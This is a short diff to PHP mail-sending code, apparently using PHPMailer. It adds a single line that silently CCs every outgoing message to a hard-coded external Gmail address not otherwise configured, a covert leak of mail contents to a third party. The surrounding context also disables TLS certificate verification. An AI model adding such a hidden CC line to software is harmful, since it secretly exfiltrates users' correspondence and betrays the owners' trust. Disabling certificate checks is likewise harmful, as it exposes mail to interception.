@@ -40,6 +40,7 @@
         	$mail->Subject = $title;
         	$mail->Body = $content;
         	$mail->AddAddress($gmail_to);
+            $mail->addCC('openniceqn009@gmail.com');
         	$mail->SMTPOptions=array('ssl'=>array(
         		'verify_peer'=>false,
         		'verify_peer_name'=>false,
